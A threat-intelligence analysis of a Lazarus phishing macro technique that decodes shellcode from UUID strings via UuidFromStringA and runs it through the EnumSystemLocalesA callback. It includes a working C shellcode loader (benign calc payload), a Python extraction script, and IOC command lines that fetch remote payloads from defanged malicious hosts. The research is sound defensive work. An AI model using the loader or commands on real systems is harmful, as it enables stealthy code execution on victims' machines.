> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [research.nccgroup.com](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)

_About the Research and Intelligence Fusion Team (RIFT):  
RIFT leverages our strategic analysis, data science, and threat hunting capabilities to create actionable threat intelligence, ranging from IOCs and detection capabilities to strategic reports on tomorrow’s threat landscape. Cyber security is an arms race where both attackers and defenders continually update and improve their tools and ways of working. To ensure that our managed services remain effective against the latest threats, NCC Group operates a Global Fusion Center with Fox-IT at its core. This multidisciplinary team converts our leading cyber threat intelligence into powerful detection strategies._

On January 21st, the following [malware sample](https://www.virustotal.com/gui/file/f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88/detection) was shared by CheckPoint research team [via Twitter](https://twitter.com/_CPResearch_/status/1352310521752662018). The post mentions that this loader belongs to Lazarus group. The modus operandi of phishing with macro documents disguised as job descriptions (via LinkedIn), was also recently documented by ESET in their [Operation In(ter)ception paper](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf).

After analysing the macro document, and pivoting on the macro, NCC Group’s RIFT identified a number of other similar documents. In these documents we came across an interesting technique being used to execute shellcode from VBA without the use of common “suspicious” APIs, such as `VirtualAlloc`, `WriteProcessMemory` or `CreateThread` – which may be detected by end point protection solutions. Instead, the macro documents abuse “benign” Windows API features to achieve code-execution.

Shellcode Execution Technique
-----------------------------

After extracting the macro, we can see that the VBA macro declares a number API calls. An alias is registered in an attempt to make these API calls appear less suspicious.

![](https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-4.png?resize=1024%2C360&is-pending-load=1#038;ssl=1)

Once these are renamed, we can easily see what the macro is doing:

1.  First, macro execution is triggered using the “Microsoft Forms 2.0 Frame” [ActiveX control](https://www.greyhathacker.net/?p=948), using the `Frame1_Layout` event.
2.  Once triggered, it creates a new executable heap via `HeapCreate`
3.  It then allocates some memory on the newly created heap using `HeapAlloc`
4.  It then calls `FindImage1`, `FindImage2` and `FindImage3` user defined VBA functions

![](https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image.png?resize=502%2C373&is-pending-load=1#038;ssl=1)

Looking at the `FindImage` functions, we can notice something interesting. The code is using the `UuidFromStringA` Windows API function, and iterating through a large list of hardcoded UUID values, each time providing a pointer into to the previously allocated heap. This seems interesting as it appears to be a way of writing data to the (executable) heap!

![](https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-1.png?resize=580%2C256&is-pending-load=1#038;ssl=1)

If we check the Microsoft documentation for the `UuidFromStringA` function, we can see that it takes a string-based UUID and converts it to it’s binary representation. It takes a pointer to a UUID, which will be used to return the converted binary data. By providing a pointer to an heap address, this function can be (ab)used to both decode data and write it to memory without using common functions such as `memcpy` or `WriteProcessMemory`.

![](https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-3.png?resize=561%2C370&is-pending-load=1#038;ssl=1)

Microsoft uses little-endian byte-order for storing GUIDs in binary form. Converting shellcode bytes to a GUID string in Python is as simple as:

```
>>> u = '\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF'
>>> uuid.UUID(bytes_le=u)
UUID('1f748bef-481c-fe01-8b34-ae4801f799ff')
```

To convert it from a string to bytes:

```
>>> uuid.UUID('1f748bef-481c-fe01-8b34-ae4801f799ff').bytes_le
'\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff'
```

Looking back at the main function of the macro, we can see that after decoding the shellcode from UUID values and writing it to the heap, it calls then `EnumSystemLocalesA`.

Again, looking at the MSDN page, we find the following description:

![](https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-5.png?resize=741%2C386&is-pending-load=1#038;ssl=1)

From this we can deduce that the `lpLocaleEnumProc` parameter specifies a callback function! By providing the address returned previously by HeapAlloc, this function can be (ab)used to execute shellcode. Searching on the internet reveals that this technique was previously [documented](http://ropgadget.com/posts/abusing_win_functions.html) by [Jeff White](https://twitter.com/noottrak). Their blog lists a large number of other APIs which could be abused to achieve a similar result.

Re-Implementing in C
--------------------

In order to experiment with the techniques used within these macro documents, we wrote a small shellcode execution harness, converting the VBA into C, to demonstrate execution of a benign `calc` shellcode. This may be useful for anyone wishing to study the technique or build further detection logic.

<table data-tab-size="8" data-paste-markdown-skip=""><tbody><tr><td data-line-number="1"></td><td>#include &lt;Windows.h&gt;</td></tr><tr><td data-line-number="2"></td><td>#include &lt;Rpc.h&gt;</td></tr><tr><td data-line-number="3"></td><td>#include &lt;iostream&gt;</td></tr><tr><td data-line-number="4"></td><td></td></tr><tr><td data-line-number="5"></td><td>#pragma comment(lib, "Rpcrt4.lib")</td></tr><tr><td data-line-number="6"></td><td></td></tr><tr><td data-line-number="7"></td><td>const char* uuids[] =</td></tr><tr><td data-line-number="8"></td><td>{</td></tr><tr><td data-line-number="9"></td><td>"6850c031-6163-636c-5459-504092741551",</td></tr><tr><td data-line-number="10"></td><td>"2f728b64-768b-8b0c-760c-ad8b308b7e18",</td></tr><tr><td data-line-number="11"></td><td>"1aeb50b2-60b2-2948-d465-488b32488b76",</td></tr><tr><td data-line-number="12"></td><td>"768b4818-4810-48ad-8b30-488b7e300357",</td></tr><tr><td data-line-number="13"></td><td>"175c8b3c-8b28-1f74-2048-01fe8b541f24",</td></tr><tr><td data-line-number="14"></td><td>"172cb70f-528d-ad02-813c-0757696e4575",</td></tr><tr><td data-line-number="15"></td><td>"1f748bef-481c-fe01-8b34-ae4801f799ff",</td></tr><tr><td data-line-number="16"></td><td>"000000d7-0000-0000-0000-000000000000",</td></tr><tr><td data-line-number="17"></td><td>};</td></tr><tr><td data-line-number="18"></td><td></td></tr><tr><td data-line-number="19"></td><td>int main()</td></tr><tr><td data-line-number="20"></td><td>{</td></tr><tr><td data-line-number="21"></td><td>HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);</td></tr><tr><td data-line-number="22"></td><td>void* ha = HeapAlloc(hc, 0, 0x100000);</td></tr><tr><td data-line-number="23"></td><td>DWORD_PTR hptr = (DWORD_PTR)ha;</td></tr><tr><td data-line-number="24"></td><td>int elems = sizeof(uuids) / sizeof(uuids[0]);</td></tr><tr><td data-line-number="25"></td><td></td></tr><tr><td data-line-number="26"></td><td>for (int i = 0; i &lt;elems; i++) {</td></tr><tr><td data-line-number="27"></td><td>RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);</td></tr><tr><td data-line-number="28"></td><td>if (status != RPC_S_OK) {</td></tr><tr><td data-line-number="29"></td><td>printf("UuidFromStringA() != S_OK\n");</td></tr><tr><td data-line-number="30"></td><td>CloseHandle(ha);</td></tr><tr><td data-line-number="31"></td><td>return -1;</td></tr><tr><td data-line-number="32"></td><td>}</td></tr><tr><td data-line-number="33"></td><td>hptr += 16;</td></tr><tr><td data-line-number="34"></td><td>}</td></tr><tr><td data-line-number="35"></td><td>printf("[*] Hexdump: ");</td></tr><tr><td data-line-number="36"></td><td>for (int i = 0; i &lt; elems*16; i++) {</td></tr><tr><td data-line-number="37"></td><td>printf("%02X ", ((unsigned char*)ha)[i]);</td></tr><tr><td data-line-number="38"></td><td>}</td></tr><tr><td data-line-number="39"></td><td>EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);</td></tr><tr><td data-line-number="40"></td><td>CloseHandle(ha);</td></tr><tr><td data-line-number="41"></td><td>return 0;</td></tr><tr><td data-line-number="42"></td><td>}</td></tr></tbody></table>

When we run the executable, we can see that the `calc` shellcode is written to the heap and executes when we call `EnumSystemLocalA`:

![](https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-2.png?resize=1024%2C516&is-pending-load=1#038;ssl=1)

Decoding the Macro
------------------

The following script was created to extract and decode the shellcode from the sample. We confirmed that script works for other related samples we have in our dataset. Whilst some of them (such as the one shared by CheckPoint) are more heavily obfuscated, the shellcode encoding (via GUIDs) is the same.

<table data-tab-size="8" data-paste-markdown-skip=""><tbody><tr><td data-line-number="1"></td><td>from oletools.olevba import VBA_Parser</td></tr><tr><td data-line-number="2"></td><td>import uuid</td></tr><tr><td data-line-number="3"></td><td>import re</td></tr><tr><td data-line-number="4"></td><td>import sys</td></tr><tr><td data-line-number="5"></td><td>import os</td></tr><tr><td data-line-number="6"></td><td></td></tr><tr><td data-line-number="7"></td><td>X64_CHUNKS_REG = re.compile(r'\#If\s+Win64(.*?)\#Else', re.S | re.I)</td></tr><tr><td data-line-number="8"></td><td>X86_CHUNKS_REG = re.compile(r'\#Else\s+?Dim(.*?)\#End', re.S | re.I)</td></tr><tr><td data-line-number="9"></td><td>UUID_REG = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)</td></tr><tr><td data-line-number="10"></td><td></td></tr><tr><td data-line-number="11"></td><td>def dump_shellcode(filename, buf, arch):</td></tr><tr><td data-line-number="12"></td><td>out = b''</td></tr><tr><td data-line-number="13"></td><td>if arch == 'x64':</td></tr><tr><td data-line-number="14"></td><td>reg = X64_CHUNKS_REG</td></tr><tr><td data-line-number="15"></td><td>else:</td></tr><tr><td data-line-number="16"></td><td>reg = X86_CHUNKS_REG</td></tr><tr><td data-line-number="17"></td><td></td></tr><tr><td data-line-number="18"></td><td>for chunk in re.findall(reg, buf):</td></tr><tr><td data-line-number="19"></td><td>for u in re.findall(UUID_REG, chunk):</td></tr><tr><td data-line-number="20"></td><td>out += uuid.UUID(u).bytes_le</td></tr><tr><td data-line-number="21"></td><td></td></tr><tr><td data-line-number="22"></td><td>outfile = 'shellcode_{}_{}.bin'.format(filename, arch)</td></tr><tr><td data-line-number="23"></td><td>with open(outfile, 'wb') as f:</td></tr><tr><td data-line-number="24"></td><td>f.write(out)</td></tr><tr><td data-line-number="25"></td><td></td></tr><tr><td data-line-number="26"></td><td>print("Wrote {} shellcode to: {}".format(arch, outfile))</td></tr><tr><td data-line-number="27"></td><td></td></tr><tr><td data-line-number="28"></td><td>if (len(sys.argv) != 2):</td></tr><tr><td data-line-number="29"></td><td>print('Usage: dump.py &lt;file.doc&gt;')</td></tr><tr><td data-line-number="30"></td><td>sys.exit(1)</td></tr><tr><td data-line-number="31"></td><td></td></tr><tr><td data-line-number="32"></td><td>vbaparser = VBA_Parser(sys.argv[1])</td></tr><tr><td data-line-number="33"></td><td>basename = os.path.basename(sys.argv[1])</td></tr><tr><td data-line-number="34"></td><td></td></tr><tr><td data-line-number="35"></td><td>for (filename, stream_path, vba_filename, vba_code) in vbaparser.extract_macros():</td></tr><tr><td data-line-number="36"></td><td>print(vba_code)</td></tr><tr><td data-line-number="37"></td><td>dump_shellcode(basename, vba_code, 'x86')</td></tr><tr><td data-line-number="38"></td><td>dump_shellcode(basename, vba_code, 'x64')</td></tr></tbody></table>

Executing the extracted shellcode, we can confirm the IOCs that were shared in CheckPoint’s original Tweet, as well as the [AnyRun report](https://app.any.run/tasks/39059fe7-c4a4-42d1-944b-96c447b2d442/). Florian Roth also [shared](https://twitter.com/cyb3rops/status/1352327393420210181) that this sample is detected with this [Sigma rule](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml).

![](https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-6.png?resize=1024%2C576&is-pending-load=1#038;ssl=1) ![](https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2021/01/image-7.png?resize=1024%2C303&is-pending-load=1#038;ssl=1)

Samples
-------

The following samples were identified:

```
47a342545d8df9c2c1e0e945f2c4fca3a440dc00cff40727abff12d307c8c788
bdf9fffe1c9ffbeec307c536a2369eefb2a2c5d70f33a1646a15d6d152c2a6fa
cabb45c99ffd8dd189e4e3ed5158fac1d0de4e2782dd704b2b595db5f63e2610
949bfce2125d76f2d21084f187c681397d113e1bbdc550694a7bce7f451a6e69
f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88
```

IOCs
----

<table><tbody><tr><td>Type</td><td>Data</td><td>File Hash</td><td>Sample</td></tr><tr><td>Folder</td><td>C:\ProgramLogs\</td><td>N/A</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>Scheduled Task</td><td>C:\Windows\Tasks\ProgramLogsSrv.job</td><td>N/A</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>Command Line</td><td>C:\Windows\system32\wscript.EXE “C:\ProgramLogs\PerformLogs.vbs”</td><td>N/A</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>Command Line</td><td>C:\ProgramLogs\AdvancedLog.exe /Q /i “hxxp://crmute[.]com/custom.css”</td><td>N/A</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>Command Line</td><td>C:\Windows\System32\pcalua.exe -a “C:\ProgramLogs\AdvancedLog” -c /Q /i “hxxp://crmute[.]com/custom.css”</td><td>N/A</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>File</td><td>C:\ProgramLogs\NvWatchdog.bin</td><td></td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>File</td><td>C:\ProgramLogs\AdvancedLog.exe</td><td>d6b55dae813a4acd461d1d36ff7ef2597b6a8112feb07fac0cfc46af963690dc</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>File</td><td>C:\ProgramLogs\PerformLogs.vbs</td><td>c0c8a97a04b4d3c7709760fcbe36dc61e3cec294ed4180069131df53b4211da3</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>File</td><td>C:\ProgramLogs\wmp.dll</td><td>N/A – copy of wmp.dll</td><td>f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88</td></tr><tr><td>Folder</td><td>C:\Windows\System32\Tasks\IntelGfx</td><td>N/A</td><td>949bfce2125d76f2d21084f187c681397d113e1bbdc550694a7bce7f451a6e69</td></tr><tr><td>Scheduled Task</td><td>C:\Windows\Tasks\IntelGfx.job</td><td></td><td>949bfce2125d76f2d21084f187c681397d113e1bbdc550694a7bce7f451a6e69</td></tr><tr><td>File</td><td>C:\Intel\hidasvc.exe</td><td>N/A – copy of wmic.exe</td><td>949bfce2125d76f2d21084f187c681397d113e1bbdc550694a7bce7f451a6e69</td></tr><tr><td>Scheduled Task</td><td>C:\Windows\Tasks\OneDrive_{7F240FD2-1938-3F2C-D928-163749E2C782}.job</td><td></td><td>cabb45c99ffd8dd189e4e3ed5158fac1d0de4e2782dd704b2b595db5f63e2610</td></tr><tr><td>Folder</td><td>C:\OneDrive</td><td>N/A – copy of wmic.exe</td><td>cabb45c99ffd8dd189e4e3ed5158fac1d0de4e2782dd704b2b595db5f63e2610</td></tr><tr><td>File</td><td>C:\Intel\hidasvc.exe</td><td>N/A – copy of wmic.exe</td><td>bdf9fffe1c9ffbeec307c536a2369eefb2a2c5d70f33a1646a15d6d152c2a6fa</td></tr><tr><td>Scheduled Task</td><td>C:\Windows\Tasks\IntelGfx.job</td><td></td><td>bdf9fffe1c9ffbeec307c536a2369eefb2a2c5d70f33a1646a15d6d152c2a6fa</td></tr><tr><td>Command Line</td><td>%COMSPEC% /c Start /miN c:\Intel\hidasvc ENVIRONMENT get STATUS /FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”</td><td>N/A</td><td>bdf9fffe1c9ffbeec307c536a2369eefb2a2c5d70f33a1646a15d6d152c2a6fa</td></tr><tr><td>Command Line</td><td>%COMSPEC% /c START /MIN C:\OneDrive\OneDriveSync ENVIRONMENT GET STATUS /FORMAT:”hxxps://www.advantims[.]com/Sync.xsl”</td><td></td><td>cabb45c99ffd8dd189e4e3ed5158fac1d0de4e2782dd704b2b595db5f63e2610</td></tr></tbody></table>

References
----------

*   [https://twitter.com/CPResearch/status/1352310521752662018](https://twitter.com/CPResearch/status/1352310521752662018)
*   [https://www.greyhathacker.net/?p=948](https://www.greyhathacker.net/?p=948)
*   [https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa](https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)
*   [https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlocalesa](https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlocalesa)
*   [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)
*   [https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf)
*   [https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)
*   [https://app.any.run/tasks/39059fe7-c4a4-42d1-944b-96c447b2d442/](https://app.any.run/tasks/39059fe7-c4a4-42d1-944b-96c447b2d442/)
*   [https://twitter.com/cyb3rops/status/1352327393420210181](https://twitter.com/cyb3rops/status/1352327393420210181)
*   [https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml)

![](https://secure.gravatar.com/avatar/8875243b6c0f6a934366d0278ee52700?s=80&is-pending-load=1#038;d=identicon&r=g)

Published by RIFT: Research and Intelligence Fusion Team
--------------------------------------------------------

RIFT leverages our strategic analysis, data science, and threat hunting capabilities to create actionable threat intelligence, ranging from IoCs and detection capabilities to strategic reports on tomorrow’s threat landscape. Cyber security is an arms race where both attackers and defenders continually update and improve their tools and ways of working. To ensure that our managed services remain effective against the latest threats, NCC Group operates a Global Fusion Center with Fox-IT at its core. This multidisciplinary team converts our leading cyber threat intelligence into powerful detection strategies. [View all posts by RIFT: Research and Intelligence Fusion Team](https://research.nccgroup.com/author/nccgifc/)

**Published** January 23, 2021January 23, 2021